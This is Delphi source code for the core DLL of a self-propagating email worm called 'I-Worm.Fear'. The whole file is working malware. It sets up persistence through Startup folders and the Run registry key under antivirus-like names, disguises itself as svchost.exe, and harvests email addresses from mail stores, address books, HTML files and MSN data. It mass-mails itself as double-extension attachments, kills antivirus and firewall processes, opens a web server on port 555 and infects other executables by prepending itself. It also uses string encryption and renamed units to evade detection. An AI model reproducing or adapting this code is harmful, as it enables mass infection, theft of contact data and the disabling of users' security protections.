   //******************************************************************************
   //**                             I-Worm.Fear                                  **
   //******************************************************************************
   //**           Please use "make.bat" If you want to compille it!!!            **
   //******************************************************************************
   //** - Infect LAN                                                             **
   //** - SMTP Engine                                                            **
   //** - Kill AV/FW                                                             **
   //** - Infect P2P (Kazaa, Edonkey, Morpheus, ...)                             **
   //** - Read email addresses from *.htm *.html *.dbx *.wab *.mbx *.tbb *.mai   **
   //**                             *.eml *.mbox                                 **
   //** - Get email addresses from Windows Messenger                             **
   //** - Search Email Addresses in Eudora Address Book                          **
   //** - Firewall Bypass                                                        **
   //** - Do not appar in task manager under 95/98/NT/2K/XP                      **
   //** - Encrypted Strings in EXE (Very Easy Encryption)                        **
   //** - Change EXE Size on P2P Network                                         **
   //** - Web-Server (Port:555)                                                  **
   //** - Prepender                                                              **
   //**                                                                          **
   //** Big thanks goes to:                                                      **
   //**                  Aphex     -- for dll injection source                   **
   //**                  ~LOM~     -- for webserver source                       **
   //**                  NiklauS   -- for prepender source                       **
   //******************************************************************************

   {$I CompMode.INI}

   LIBRARY Fear_DLL;

   {$IFDEF Debug}
   uses
     AclUtils in 'ACLUnits\ACLUTILS.PAS',
     sClasses in 'ACLUnits\SCLASSES.PAS',
     Registry in 'ACLUnits\REGISTRY.PAS',
     P2P in 'P2P.PAS',
     LAN in 'LAN.PAS',
     Utils in 'UTILS.PAS',
     Email in 'EMAIL.PAS',
     KillAV in 'KILLAV.PAS',
     GetProc in 'GETPROC.PAS',
     MXLookup in 'MXLookup.PAS',
     ExtractDBX in 'ExtractDBX.PAS',
     Webserver in 'WEBSERVER.PAS',
     Sockets in 'SOCKETS.PAS',
     Prepender in 'PREPENDER.PAS',
     Windows;

   {$ELSE}
   USES
   //Delphi put original name of units into the end of .exe file. I do not want to
   //display KillAV, P2P, Email, etc strings at the end of the generated file,
   //therefore I rename the units before compille.
     B1 in 'ACLUnits\B1.PAS',                                                      {ACLUTILS}
     B2 in 'ACLUnits\B2.PAS',                                                      {SCLASSES}
     B3 in 'ACLUnits\B3.PAS',                                                      {REGISTRY}
     A8 in 'TEMP\A8.PAS',                                                          {P2P}
     A7 in 'TEMP\A7.PAS',                                                          {LAN}
     A6 in 'TEMP\A6.PAS',                                                          {Utils}
     A1 in 'TEMP\A1.PAS',                                                          {Email}
     A5 in 'TEMP\A5.PAS',                                                          {KillAV}
     A3 in 'TEMP\A3.PAS',                                                          {GetProc}
     A4 in 'TEMP\A4.PAS',                                                          {MXLookup}
     A2 in 'TEMP\A2.PAS',                                                          {ExtractDBX}
     A9 in 'TEMP\A9.PAS',                                                          {WebServer}
     A10 in 'TEMP\A10.PAS',                                                        {Sockets}
     A11 in 'TEMP\A11.PAS',                                                        {Prepender}
     Windows;
   {$ENDIF}

   VAR
     Msg                   : TMsg;
     SendMailBusy          : BOOL = False;
     WebServerWorking      : BOOL = False;
     ErrorMessageThread    : THandle;
     SentEmail             : WORD = 0;
     NumberOfBodys         : WORD;
     NumberOfSubjects      : WORD;
     NumberOfExtensions1   : WORD;
     NumberOfExtensions2   : WORD;
     NumberOfAttachments   : WORD;
     NumberOfErrorMessages : WORD;
     Bodys                 : XArray;
     Subjects              : XArray;
     Extensions1           : XArray;                                               //XArray include the decoded strings
     Extensions2           : XArray;
     Attachments           : XArray;
     ErrorMessages         : XArray;
     FearRegKey            : STRING;

   CONST
     KILL_AV_INTERVALL     = 04000; // (= 04 sec) [milisec]
     SEND_EMAIL_INTERVALL  = 10000; // (= 10 sec) [milisec]

   TYPE
     TFarProc = Pointer;
     TFNThreadStartRoutine = TFarProc;

   {$I RESOURCES\TBODYS.INI}
   {$I RESOURCES\TSUBJECTS.INI}
   {$I RESOURCES\TEXTENSIONS1.INI}
   {$I RESOURCES\TEXTENSIONS2.INI}
   {$I RESOURCES\TATTACHMENTS.INI}
   {$I RESOURCES\TERRORMESSAGES.INI}

   FUNCTION RandomFileName : STRING;                                               //Generate 5-15 caracter long random file name
   VAR
     I : BYTE;
   BEGIN
     FOR I:=1 TO Random(10)+5 DO RESULT:=RESULT+Chars[Random(61)+1];
     RESULT:=RESULT+MainStr[5];                                                    //".exe"
   END;

   PROCEDURE InfectStartUpDir;
   VAR
     I : BYTE;
     S : STRING;
   BEGIN
     FOR I:=0 TO 1 DO BEGIN
       Reg.RootKey:=HKEY_CURRENT_USER+I;
       Reg.OpenKey(MainStr[47]+MainStr[29],True);                                  //"Windows\CurrentVersion\explorer\Shell Folders"
       IF Reg.KeyExists(MainStr[27+I*3]) THEN BEGIN
         S:=Reg.ReadString(MainStr[27+I*3])+'\';                                   //"Startup","Common Startup"
         IF S<>'' THEN CopyFiles(True,S+RandomFileName);
       END;
       Reg.CloseKey;
     END;
   END;

   PROCEDURE SetFearRegKey;                                                        //Register a random file into registry
   VAR
     I : BYTE;
     S : STRING;
     X : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[47]+MainStr[35],True);                                    //"Windows\CurrentVersion\Run"
     S:=AVName[Random(NumberOfAVNames-1)+1];
     I:=Pos('.',S);
     IF I>0 THEN SetLength(S,I-1);
     X:=WinPath+RandomFileName;
     Reg.WriteString(S,X);
     Reg.CloseKey;
     CopyFiles(True,X);
   END;

   PROCEDURE QuickSort(Left,Right:WORD);
   VAR
     Up,Down : WORD;
     Compare : STRING;
   BEGIN
     Up:=Left;
     Down:=Right;
     Compare:=Emails.Strings[(Left+Right) DIV 2];
     REPEAT
       WHILE Emails.Strings[Up]<Compare DO Inc(Up);
       WHILE Compare<Emails.Strings[Down] DO Dec(Down);
       IF Up<=Down THEN BEGIN
         Emails.Exchange(Up,Down);
         Inc(Up);
         Dec(Down);
       END;
     UNTIL Up>Down;
     IF Left<Down THEN QuickSort(Left,Down);
     IF Up<Right  THEN QuickSort(Up,Right);
   END;

   FUNCTION GetFearRegKey : STRING;
   VAR
     I    : WORD;
     O    : WORD;
     Keys : TStrings;
   BEGIN
     Keys:=TStringList.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[39],False);                                               //"\SOFTWARE"
     Reg.GetKeyNames(Keys);
     FOR I:=0 TO Keys.Count-1 DO
       FOR O:=1 TO NumberOfAVNames DO
         IF Pos(Keys.Strings[I],AVName[O])=1 THEN BEGIN
           Reg.OpenKey(MainStr[46]+Keys.Strings[I],False);                         //"\SOFTWARE\"
           IF(Reg.ValueExists(MainStr[38]))AND(Reg.ValueExists(MainStr[37])) THEN BEGIN //"Sent","email_num"
             RESULT:=Keys.Strings[I];
             Break;
           END;
         END;
     IF RESULT='' THEN BEGIN
       RESULT:=AVName[Random(NumberOfAVNames-1)+1];
       I:=Pos('.',RESULT);
       IF I>0 THEN SetLength(RESULT,I-1);
     END;
     Keys.Free;
     Reg.CloseKey;
   END;

   FUNCTION MailURLMayBeInvalid(S:STRING) : BOOL;
   VAR
     I : Integer;
     C : STRING;
   BEGIN
     Result:=(Trim(S)='')OR(Pos(' ',AnsiLowerCase(S))>0)OR                         //' ', ä, ö, ü, ß, [, ], (, ), : in EMail-Address
       (Pos('ä',AnsiLowerCase(S))>0)OR(Pos('ö',AnsiLowerCase(S))>0)OR
       (Pos('ü',AnsiLowerCase(S))>0)OR(Pos('ß',AnsiLowerCase(S))>0)OR
       (Pos('[',AnsiLowerCase(S))>0)OR(Pos(']',AnsiLowerCase(S))>0)OR
       (Pos('(',AnsiLowerCase(S))>0)OR(Pos(')',AnsiLowerCase(S))>0)OR
       (Pos(':',AnsiLowerCase(S))>0);
     IF Result THEN Exit;                                                          //@ not in EMail-Address
     I:=Pos('@',S);
     Result:=(I=0)OR(I=1)OR(I=Length(S));
     IF Result THEN Exit;
     Result:=(Pos('@',Copy(S,I+1,Length(S)-1))>0);
     IF Result THEN Exit;                                                          //Domain <= 1
     C:=Copy(S,I+1,Length(S));
     Result:=Length(C)<=1;
     IF Result THEN Exit;
     I:=Pos('.',C);
     Result:=(I=0)OR(I=1)OR(I=Length(C));
   END;

   PROCEDURE ClearEmail(S:STRING);
   VAR
     I : WORD;
     C : Char;
   BEGIN
     S:=AnsiUpperCase(S);
     FOR I:=Pos('@',S)+1 TO Length(S) DO
       IF ((S[I]<'0')OR(S[I]>'9'))AND((S[I]<'A')OR(S[I]>'Z'))AND(S[I]<>'.')AND(S[I]<>'-')AND(S[I]<>'_') THEN BEGIN
         SetLength(S,I-1);
         Break;
       END;
     IF NOT MailURLMayBeInvalid(S) THEN Emails.Add(S);
   END;

   PROCEDURE GetMSNEmails;
   VAR
     I   : Longint;
     J   : Longint;
     P   : ARRAY [0..400] OF Char;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     IF Reg.KeyExists(MainStr[36]) THEN BEGIN
       Reg.Openkey(MainStr[36],False);
       I:=0;
       WHILE Reg.ValueExists(MainStr[31]+IntToStr(I)) DO BEGIN                     //"Allow"
         J:=Reg.GetDataSize(MainStr[31]+IntToStr(I));                              //"Allow"
         IF J<>-1 THEN BEGIN
             Reg.ReadBinaryData(MainStr[31]+IntToStr(I),P,J);                      //"Allow"
             ClearEmail(STRING(P));
         END;
         INC(I);
       END;
     END;
     Reg.CloseKey;
   END;

   PROCEDURE ReadWAB(FileName:STRING);
   VAR
     F       : FILE;
     I       : DWORD;
     S       : STRING;
     N       : ARRAY[1..5] OF Char;
     Buf     : ARRAY[1..500] OF Char;
   BEGIN
     AssignFile(F,FileName);
     IF(FileName<>'')AND(FileExists(FileName)) THEN BEGIN
       {$I-}
       Reset(F,1);
       IF IOResult=0 THEN BEGIN
         REPEAT
           BlockRead(F,N,2);
           IF N[1]+N[2]=#03#48 THEN BEGIN
             BlockRead(F,Buf,Ord(N[2])+30);
             S:='';
             FOR I:=1 TO Ord(N[2])+30 DO S:=S+Buf[I];
             Delete(S,1,3);
             I:=Pos(#00#00#00,S);
             IF I>0 THEN SetLength(S,I-1);
             FOR I:=1 TO Ord(N[2]) DO IF S[I]=#00 THEN Delete(S,I,1);
             FOR I:=1 TO Length(S) DO
               IF S[I]<chr(45) THEN BEGIN
                 SetLength(S,I-1);
                 Break;
               END;
            IF (Pos('@',S)>0)AND(Pos('.',S)>0) THEN ClearEmail(S);
           END ELSE Seek(F,FilePos(F)-1);
         UNTIL FileSize(F)-FilePos(F)<6;
         CloseFile(F);
       END;
       {$I+}
       IF Emails.Count>2 THEN QuickSort(1,Emails.Count-1);
       FOR I:=Emails.Count-2 DOWNTO 1 DO IF Emails.Strings[I]=Emails.Strings[I+1] THEN Emails.Delete(I);
     END;
   END;

   PROCEDURE WriteEmailsReg;
   VAR
     I : DWORD;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[46]+FearRegKey,True);                                     //"\Software\"
     IF Emails.Count>0 THEN FOR I:=0 TO Emails.Count-1 DO Reg.WriteString(IntToStr(I),Emails.Strings[I]);
     Reg.WriteInteger(MainStr[37],Emails.Count);                                   //"email_num"
     Reg.WriteInteger(MainStr[38],SentEmail);                                      //"sent"
     Reg.CloseKey;
   END;

   PROCEDURE ReadEmailsReg;
   VAR
     I : DWORD;
   BEGIN
     Emails.Clear;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     IF Reg.OpenKey(MainStr[46]+FearRegKey,False) THEN BEGIN                       //"\Software\"
       IF Reg.KeyExists(MainStr[38]) THEN SentEmail:=Reg.ReadInteger(MainStr[38]); //"sent"
       IF Reg.KeyExists(MainStr[37]) THEN BEGIN
         I:=Reg.ReadInteger(MainStr[37]);                                          //"email_num"
         IF I>0 THEN FOR I:=0 TO I-1 DO Emails.Add(Reg.ReadString(IntToStr(I)));
       END;
     END;
     Reg.CloseKey;
   END;

   FUNCTION FirstRun : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey(MainStr[39],False);                                               //"\Software"
     RESULT:=NOT Reg.KeyExists(FearRegKey);
     Reg.CreateKey(FearRegKey);
     Reg.CloseKey;
   END;

   PROCEDURE SendMail;
   BEGIN
     IF(InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(SendMailBusy=False) THEN BEGIN
       SendMailBusy:=True;
       IF SentEmail>Emails.Count-1 THEN SentEmail:=0;
       Reg.RootKey:=HKEY_LOCAL_MACHINE;
       Reg.OpenKey(MainStr[46]+FearRegKey,True);                                   //"\Software\"
       Reg.WriteInteger(MainStr[38],SentEmail);                                    //"Sent"
       Reg.CloseKey;
       TRY
         SendEmail(Subjects[Random(NumberOfSubjects-1)+1],Bodys[Random(NumberOfBodys-1)+1],Emails[SentEmail],Attachments[Random(NumberOfAttachments-1)+1]+'.'+Extensions1[Random(NumberOfExtensions1-1)+1]+'.'+Extensions2[Random(NumberOfExtensions2-1)+1]);
         Inc(SentEmail);
       EXCEPT
       END;
       SendMailBusy:=False;
     END;
   END;

   PROCEDURE FindEmail(EFile:AnsiString);                                          //Search email address in html files
   VAR
     F : TextFile;
     I : WORD;
   BEGIN
     IF FileExists(EFile) THEN BEGIN
       AssignFile(F,EFile);
       {$I-}
       Reset(F);
       IF IOResult=0 THEN BEGIN
         REPEAT
           ReadLn(F,EFile);
           IF IOResult=0 THEN BEGIN
             EFile:=AnsiUpperCase(EFile);
             I:=Pos('LTO:',EFile);
             IF I>0 THEN BEGIN
               Delete(EFile,1,I+3);
               I:=Pos('"',EFile);
               IF I>0 THEN Delete(EFile,I,Length(EFile));
               ClearEmail(EFile);
             END;
           END;
         UNTIL EOF(F);
         CloseFile(F);
       END;
       {$I+}
     END;
   END;

   PROCEDURE GetEmailsFromMBX_TBB(FileName:STRING);
   LABEL
     Abort, Close;
   VAR
     F : TextFile;
     S : STRING;
     T : STRING;
     G : STRING;
     K : STRING;
     A : Byte;
     B : Byte;
     C : Byte;
     H : Byte;
     Y : Byte;
   BEGIN
     H:=0;
     AssignFile(F,FileName);
     {$I-}
     Reset(F);
     IF IOResult<>0 THEN GOTO Abort;
     REPEAT
       ReadLn(F,S);
       IF IOResult<>0 THEN GOTO Close;
       FOR C:=0 TO 3 DO BEGIN
         IF C=0 THEN K:='To: ';
         IF C=1 THEN K:='From: ';
         IF C=2 THEN K:='cc: ';
         IF C=3 THEN K:='Cc: ';
         IF Pos(K,S)=1 THEN BEGIN
           IF C=1 THEN Y:=2 ELSE Y:=0;
           Delete(S,1,Pos(K,S)+3+Y);
           IF Pos('<',S)>0 THEN BEGIN
             H:=0;
             REPEAT
               IF H=1 THEN BEGIN
                H:=0;
                 Readln(F,S);
                 IF IOResult<>0 THEN GOTO Close;
               END;
               REPEAT
                 A:=Pos('<',S);
                 B:=Pos('>',S);
                 T:=Copy(S,A+1,B-A-1);
                 IF Pos('@',T)>0 THEN ClearEmail(T);
                Delete(S,1,B);
               UNTIL Pos('<',S)=0;
               IF Pos(',',S)>0 THEN H:=1;
             UNTIL H=0;
           END ELSE IF Pos('@',S)>0 THEN BEGIN
             IF (C<>1) THEN BEGIN
               G:=S;
               WHILE G[Length(G)]=',' DO BEGIN
                 Readln(F,G);
                 IF IOResult<>0 THEN GOTO Close;
                 S:=S+G;
               END;
               REPEAT
                 A:=0;
                 REPEAT
                   INC(A);
                 UNTIL S[A]<>' ';
                 G:=Copy(S,A,Pos(',',S)-A);
                 Delete(S,1,Pos(',',S));
                 IF Pos(' ',G)>0 THEN SetLength(G,Pos(' ',G));
                 IF(G<>'')AND(Pos('@',G)>0) THEN ClearEmail(G)
               UNTIL Pos(',',S)=0;
               A:=0;
               REPEAT
                 INC(A);
               UNTIL S[A]<>' ';
               Delete(s,1,a-1);
               IF Pos(' ',S)>0 THEN SetLength(S,Pos(' ',S));
               IF Pos('@',S)>0 THEN ClearEmail(S)
             END;
           END;
         END;
       END;
     UNTIL EOF(F);
     Close:
     CloseFile(F);
     Abort:
     {$I+}
   END;

   PROCEDURE ReadEudora(FileName:STRING);                                          //Search email addresses if NNdbase.txt (Eudora Address Book)
   LABEL
     Abort;
   VAR
     F : TextFile;
     S : STRING;
     I : WORD;
   BEGIN
     IF FileName<>'' THEN BEGIN
       AssignFile(F,FileName);
       {$I-}
       Reset(F);
       IF IOResult=0 THEN BEGIN
         REPEAT
           Readln(F,S);
           IF IOResult<>0 THEN GOTO Abort;
           IF S[1]='>' THEN BEGIN
             Delete(S,1,1);
             IF Pos(' ',S)=0 THEN ClearEmail(S);
           END ELSE
           IF Pos(MainStr[74]+' ',S)>0 THEN BEGIN
             IF POS('"',S)>0 THEN BEGIN
               Delete(S,1,Pos('"',S));
               Delete(S,1,Pos('"',S)+1);
             END ELSE BEGIN
               Delete(S,1,Pos(' ',S));
               Delete(S,1,Pos(' ',S));
             END;
             REPEAT
               I:=Pos(',',S);
               IF I>0 THEN BEGIN
                 ClearEmail(Copy(S,1,I-1));
                 Delete(S,1,I);
               END ELSE BEGIN
                 ClearEmail(S);
                 S:='';
               END;
             UNTIL Length(S)=0;
           END;
           IF Pos(MainStr[58],S)>0 THEN BEGIN
             Delete(S,1,Pos(MainStr[58],S)+10);
             REPEAT
               I:=Pos(#03,S);
               IF I>0 THEN BEGIN
                 ClearEmail(Copy(S,1,I-1));
                 Delete(S,1,I);
               END ELSE BEGIN
                 I:=Pos('>',S);
                 ClearEmail(Copy(S,1,I-1));
                 S:='';
               END;
             UNTIL Length(S)=0;
           END;
         UNTIL Eof(F);
         Abort:
         CloseFile(F);
       END;
      {$I-}
     END;
   END;

   PROCEDURE SearchInDir(Path:AnsiString);
   VAR
     D     : TSearchRec;
     Error : Integer;
     I     : Byte;
     S     : STRING;
   BEGIN
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*.'+MainStr[106],faAnyFile OR faHidden,D);             //"dbx"
     WHILE Error=0 DO BEGIN
       ExtrackEmailFromDBX(Path+D.Name);
       Error:=FindNext(D);
     END;
     //////////////////////////////////////////////////////////////////////////////
     FOR I:=1 TO 5 DO BEGIN
       CASE I OF
         1 : S:=MainStr[120];                                                      //"mbx"
         2 : S:=MainStr[121];                                                      //"tbb"
         3 : S:=MainStr[122];                                                      //"eml"
         4 : S:=MainStr[123];                                                      //"mai"
         5 : S:=MainStr[124];                                                      //"mbox"
       END;
       Error:=FindFirst(Path+'*.'+S,faAnyFile OR faHidden,D);
       WHILE Error=0 DO BEGIN
         GetEmailsFromMBX_TBB(Path+D.Name);
         Error:=FindNext(D);
       END;
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*.'+MainStr[125],faAnyFile OR faHidden,D);             //"wab"
     WHILE Error=0 DO BEGIN
       ReadWAB(Path+D.Name);
       Error:=FindNext(D);
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+MainStr[77],faAnyFile OR faHidden,D);                   //Search in Eudora Address Book
     WHILE Error=0 DO BEGIN
       ReadEudora(Path+D.Name);
       Error:=FindNext(D);
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*.'+MainStr[107],faAnyFile OR faHidden,D);             //"htm"
     WHILE Error=0 DO BEGIN
       FindEmail(Path+D.Name);
       Error:=FindNext(D);
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*.'+MainStr[108],faAnyFile OR faHidden,D);             //"html"
     WHILE Error=0 DO BEGIN
       FindEmail(Path+D.Name);
       Error:=FindNext(D);
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*'+MainStr[5],faAnyFile OR faHidden,D);                //".exe"
     WHILE Error=0 DO BEGIN
       FOR I:=126 TO 140 DO IF Pos(MainStr[I],UpperCase(D.Name))>0 THEN Prepend(StartEXEName,Path+D.Name);
       Error:=FindNext(D);
     END;
     //////////////////////////////////////////////////////////////////////////////
     Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
     WHILE Error=0 DO BEGIN
       IF (D.Attr AND faDirectory>0)AND(D.Name[1]<>'.') THEN begin SearchInDir(Path+D.Name+'\');end;
       Error:=FindNext(D);
     END;
   END;

   PROCEDURE SearchAllDir;
   VAR
     I : BYTE;
   BEGIN
     FOR I:=Ord('c') TO Ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchInDir(Chr(I)+':\');
   END;

   PROCEDURE StartWEB;                                                             //Start Web-Server
   BEGIN
     IF InternetGetConnectedState(NIL,0) THEN BEGIN
       IF(WebServerWorking=False)AND(NameToIP('')<>'') THEN BEGIN
         StartWSA;
         StartWebServer('555',WinPath);                                            //Port=555
         WebServerWorking:=True;
       END;
     END ELSE WebServerWorking:=False;
   END;

   PROCEDURE InitTimers;
   BEGIN
     SetTimer(0,1,SEND_EMAIL_INTERVALL,@SendMail);
     SetTimer(0,2,KILL_AV_INTERVALL,@AVKiller);
     SetTimer(0,3,10000,@StartWeb);
   END;

   PROCEDURE DecodeOtherStrings;
   BEGIN
     NumberOfExtensions1:=DecodeStrings(TExtensions1,Extensions1);
     NumberOfExtensions2:=DecodeStrings(TExtensions2,Extensions2);
     NumberOfBodys:=DecodeStrings(TBodys,Bodys);
     NumberOfErrorMessages:=DecodeStrings(TErrorMessages,ErrorMessages);
     NumberOfAttachments:=DecodeStrings(TAttachments,Attachments);
     NumberOfSubjects:=DecodeStrings(TSubjects,Subjects);
     NumberOfAVNames:=DecodeStrings(TAVName,AVName);
   END;

   PROCEDURE ErrorMessage;
   BEGIN
     MessageBox(0,pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND);
     ExitThread(ErrorMessageThread);
   END;

   PROCEDURE Main;                                                                 //Main part of the worm
   BEGIN
     DecodeAllStrings;                                                             //Decode The Main Strings
     InitProcesses;
     InitEmailProcesses;
     DecodeOtherStrings;
     SetWinPath;
     Randomize;
     StartEXEName:=WinPath+MainStr[105];                                           //"svchost.exe"
     Reg:=TRegistry.Create;
     FearRegKey:=GetFearRegKey;
     Emails:=TStringList.Create;
     AVKiller;
     IF FirstRun THEN BEGIN
       ErrorMessageThread:=BeginThread(NIL,0,@ErrorMessage,NIL,0,ThreadID);
       SetFearRegKey;
     END;
     InitPeerToPeer;
     InfectStartUpDir;
     ReadEmailsReg;
     SearchAllDir;
     GetMSNEmails;
     WriteEmailsReg;
     InitTimers;
     BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);
     WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
   END;

   PROCEDURE EntryPoint(Reason:DWORD); STDCALL;
   BEGIN
     IF Reason=1 THEN BeginThread(NIL,0,TFNThreadStartRoutine(@Main),NIL,0,ThreadID);
   END;

   BEGIN
     DLLProc:=@EntryPoint;
     EntryPoint(1);
   END.
